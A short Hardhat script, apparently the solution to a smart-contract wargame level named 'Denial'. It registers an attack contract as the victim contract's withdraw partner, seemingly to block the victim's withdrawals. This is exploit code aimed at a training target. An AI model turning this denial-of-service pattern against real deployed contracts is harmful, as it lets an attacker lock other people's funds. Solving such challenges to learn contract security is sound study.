import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xf3eE3C4Ec25e8414838567818A30C90c7d62f834"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"
const ATTACK_ADDRESS = "0x7A9Ec1d04904907De0ED7b6839CcdD59c3716AC9"

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("Denial", CONTRACT_ADDRESS, signer)
  const attackContract = await ethers.getContractAt("DenialAttack", ATTACK_ADDRESS, signer)

  await contract.setWithdrawPartner(ATTACK_ADDRESS)
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
